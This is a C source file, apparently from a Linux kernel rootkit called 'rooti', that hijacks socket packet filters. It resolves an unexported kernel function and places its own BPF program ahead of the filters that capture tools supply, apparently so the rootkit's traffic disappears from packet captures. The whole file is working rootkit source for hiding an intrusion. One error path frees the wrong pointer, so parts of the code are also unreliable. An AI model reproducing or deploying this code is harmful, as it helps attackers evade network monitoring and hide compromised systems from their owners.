#include <linux/socket.h>
#include <linux/filter.h>
#include "net.h"
#include "../../utils.h"
#include "../../config.h"

#ifdef ROOTI_PCAP_FILTER_METHOD_PROG

static void rooti_replace_ret_instructions(struct sock_fprog_kern *fprog, loff_t program_offset)
{
    loff_t jmp_offset;

    for (int i = 0; i < program_offset; i++) {
        if (BPF_CLASS(fprog->filter[i].code) != BPF_RET || fprog->filter[i].k == 0) {
            continue;
        }

        jmp_offset = program_offset - (i + 1);
        fprog->filter[i].code = BPF_JMP | BPF_JA;
        fprog->filter[i].jt = 0;
        fprog->filter[i].jf = 0;
        fprog->filter[i].k = jmp_offset;
    }
}

static int rooti_merge_fprogs(struct sock_fprog_kern *src_fprog1,
                                       struct sock_fprog_kern *src_fprog2,
                                       struct sock_fprog_kern *dst_fprog)
{
    dst_fprog->len = src_fprog1->len + src_fprog2->len;
    dst_fprog->filter = kcalloc(dst_fprog->len, sizeof(struct sock_filter), GFP_KERNEL);
    if (dst_fprog->filter == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    memcpy(dst_fprog->filter, src_fprog1->filter, bpf_classic_proglen(src_fprog1));
    memcpy(dst_fprog->filter + src_fprog1->len, src_fprog2->filter, bpf_classic_proglen(src_fprog2));
    rooti_replace_ret_instructions(dst_fprog, src_fprog1->len);

    return 0;
}

static int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel,
                                 struct sock_fprog __user *user_fprog)
{
    size_t user_program_size = bpf_classic_proglen(user_fprog);
    int ret;

    user_fprog_kernel->len = user_fprog->len;
    user_fprog_kernel->filter = kmalloc(user_program_size, GFP_KERNEL);
    if (user_fprog_kernel->filter == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        ret = -ENOMEM;
        goto error_alloc_fprog;
    }

    ret = copy_from_user(user_fprog_kernel->filter, user_fprog->filter, user_program_size);
    if (ret > 0) {
        ROOTI_DEBUG("copy_from_user() failed: %d", ret);
        ret = -EFAULT;
        goto error_copy_fprog;
    }

    return 0;

error_copy_fprog:
    kfree(user_fprog_kernel);
error_alloc_fprog:
    return ret;
}

static int rooti_attach_packet_filter(struct sock *sock, struct sock_fprog_kern *fprog)
{
    ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);
    struct bpf_prog *bpf_prog;
    int err;

    err = bpf_prog_create(&bpf_prog, fprog);
    if (err) {
        ROOTI_DEBUG("bpf_prog_create() failed %d", err);
        goto error_create_prog;
    }

    err = ____sk_attach_prog(bpf_prog, sock);
    if (err) {
        ROOTI_DEBUG("__sk_attach_prog() failed: %d", err);
        goto error_attach_prog;
    }

    return 0;

error_attach_prog:
    bpf_prog_destroy(bpf_prog);
error_create_prog:
    return err;
}

int rooti_inject_packet_filter(struct sock *sock, struct sock_fprog __user *user_fprog)
{
    struct sock_fprog_kern rooti_fprog = {
        .filter = ROOTI_PCAP_BPF_PROG,
        .len = ROOTI_PCAP_BPF_PROG_COUNT
    };
    struct sock_fprog_kern user_fprog_kernel;
    struct sock_fprog_kern merged_fprog;
    int err;

    err = rooti_copy_user_fprog(&user_fprog_kernel, user_fprog);
    if (err) {
        ROOTI_DEBUG("rooti_copy_user_fprog() failed: %d", err);
        goto out_copy_fprog;
    }

    err = rooti_merge_fprogs(&rooti_fprog, &user_fprog_kernel, &merged_fprog);
    if (err) {
        ROOTI_DEBUG("rooti_merge_fprogs() failed: %d", err);
        goto out_merge_fprogs;
    }

    err = rooti_attach_packet_filter(sock, &merged_fprog);
    if (err) {
        ROOTI_DEBUG("rooti_attach_packet_filter() failed: %d", err);
        goto out_attach_filter;
    }

    err = 0;

out_attach_filter:
    kfree(merged_fprog.filter);
out_merge_fprogs:
    kfree(user_fprog_kernel.filter);
out_copy_fprog:
    return err;
}

int rooti_overwrite_packet_filter(struct sock *sock)
{
    struct sock_fprog_kern fprog = {
        .filter = ROOTI_PCAP_BPF_PROG,
        .len = ROOTI_PCAP_BPF_PROG_COUNT
    };

    int err = rooti_attach_packet_filter(sock, &fprog);
    if (err) {
        ROOTI_DEBUG("rooti_attach_packet_filter() failed: %d", err);
        return err;
    }

    return 0;
}

#endif
